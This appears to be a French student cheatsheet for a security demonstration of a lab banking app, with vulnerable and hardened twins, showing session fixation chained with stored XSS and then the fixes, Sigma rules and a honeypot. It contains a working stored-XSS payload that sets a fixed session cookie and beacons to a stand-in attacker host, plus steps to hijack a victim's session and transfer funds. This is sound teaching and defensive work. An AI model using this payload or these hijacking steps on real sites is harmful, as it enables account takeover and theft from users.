# Cheatsheet de démonstration (soutenance)

Document à garder ouvert pendant la présentation orale.

## Avant l'arrivée du jury

```bash
# 1. Hostnames
sudo bash scripts/setup-hosts.sh

# 2. Build & start
docker compose up --build -d

# 3. Sanity checks
curl -s -o /dev/null -w "%{http_code}\n" -H "Host: vuln.bank.local"   http://localhost:8080/
curl -s -o /dev/null -w "%{http_code}\n" -H "Host: secure.bank.local" http://localhost:8080/
curl -s -o /dev/null -w "%{http_code}\n" -H "Host: evil.attacker.lab" http://localhost:8080/
# attendu : 200 / 200 / 200

# 4. Ouvrir 3 onglets navigateur
#    - http://vuln.bank.local   (deux fenêtres : Alice + Mallory)
#    - http://secure.bank.local
#    - http://evil.attacker.lab (dashboard attaquant)

# 5. Terminal pour inspecter la BDD à la demande
docker exec -it p03-mysql mysql -uroot -prootpass
```

## Déroulé suggéré (15 min)

### (1) Présentation du contexte — 1 min
> "Application bancaire CaptusBank. Deux versions jumelles : `vuln` et `secure`.
> Démonstration d'une chaîne d'attaque réelle, puis blocage côté sécurisé."

### (2) Reconnaissance — 2 min
> Sur Mallory, connexion → noter le SID via DevTools → identique avant/après. **Voilà la faille.**

### (3) Pose du payload XSS stocké — 1 min
- Mallory se connecte sur `vuln.bank.local`
- /comments.php → publier le payload :
  ```html
  <script>
    document.cookie="PHPSESSID=ATTACKER_FIXED_SID_001;path=/";
    new Image().src="http://evil.attacker.lab/collect.php?m=stored-xss&sid=ATTACKER_FIXED_SID_001";
  </script>
  ```

### (4) Envoi du lien piégé — 30 sec
> Montrer http://evil.attacker.lab/phishing.html (l'email simulé).

### (5) Côté Alice — 2 min
- Ouvrir l'URL piégée `http://vuln.bank.local/login.php?PHPSESSID=ATTACKER_FIXED_SID_001`
- Visiter /comments.php → le dashboard attaquant clignote (nouvelle ligne)
- Alice se connecte avec ses credentials → tableau de bord, 12 450 €

### (6) Retour côté Mallory — 1 min
- Mallory force le cookie `PHPSESSID=ATTACKER_FIXED_SID_001` dans son navigateur
- Visite `/dashboard.php` → **il voit le compte d'Alice**
- /transfer.php → 9 999 € vers son compte

### (7) Preuve par la BDD — 2 min
```sql
USE bank_vuln;
SELECT sid, user_id, ip_address, last_seen FROM sessions
WHERE sid = 'ATTACKER_FIXED_SID_001';
```

> **Un seul SID, user_id=1 (Alice), 2 IPs distinctes dans les access logs.**

### (8) Test sur la version sécurisée — 2 min
- Sur `secure.bank.local`, tenter le même `?SBSID=ATTACKER_FIXED_SID_001` → ignoré
- Tenter de coller un payload `<script>` dans un commentaire → HTML-encodé, inoffensif
- Inspecter `bank_secure.audit_log` :
  ```sql
  USE bank_secure;
  SELECT created_at, event, severity FROM audit_log
  WHERE severity IN ('warning', 'critical') ORDER BY id DESC LIMIT 10;
  ```

### (9) Tests automatisés — 1 min
```bash
pip install -r scripts/requirements.txt
pytest tests/ -v
# tous les tests passent : vuln (attaque réussie) + secure (attaque bloquée)
```

### (10) SIEM & honeypot — 1 min
> Présenter les 4 règles Sigma dans `siem/`. Expliquer la détection :
> SID partagé entre 2 IPs, fingerprint mismatch, payload XSS, honeypot triggered.

### (11) Q&A — 2 min

## Snippets utiles à montrer rapidement

### Le diff critique (1 ligne qui résout tout)
[app-vulnerable/public/login.php:35](../app-vulnerable/public/login.php#L35) vs
[app-secure/public/login.php:33](../app-secure/public/login.php#L33) :

```diff
- // (rien)
+ session_regenerate_id(true);
```

### Différences PHP.INI
[app-vulnerable/Dockerfile](../app-vulnerable/Dockerfile) vs
[app-secure/Dockerfile](../app-secure/Dockerfile)

| Directive                    | Vulnérable | Sécurisé |
|------------------------------|:----------:|:--------:|
| `session.use_strict_mode`    |     0      |    1     |
| `session.use_only_cookies`   |     0      |    1     |
| `session.use_trans_sid`      |     1      |    0     |
| `session.cookie_httponly`    |     0      |    1     |
| `session.cookie_samesite`    |    none    |  Strict  |

## Si une question piège tombe

**Q : Pourquoi pas seulement `htmlspecialchars` ?**
> Parce qu'il reste le vecteur URL (use_trans_sid). La défense est en profondeur.

**Q : Si SameSite=Strict est posé, pourquoi régénérer le SID ?**
> SameSite n'aide pas si l'attaquant ne fait PAS de cross-site — il pousse juste un cookie.
> Et SameSite n'existe pas sur tous les navigateurs anciens (mobile embarqué).

**Q : Le binding IP ne casse pas l'UX en mobile ?**
> Si l'IP exacte. C'est pour ça qu'on prend le `/24` : tolérance changement de cell tower.

**Q : Vous stockez le mot de passe dans le seed SQL ?**
> Oui pour la démo. Le bootstrap PHP les rehash en bcrypt cost-10 au premier démarrage.

**Q : Pourquoi un honeypot ?**
> Détection passive : aucun usage légitime → un seul login = certitude de compromission.
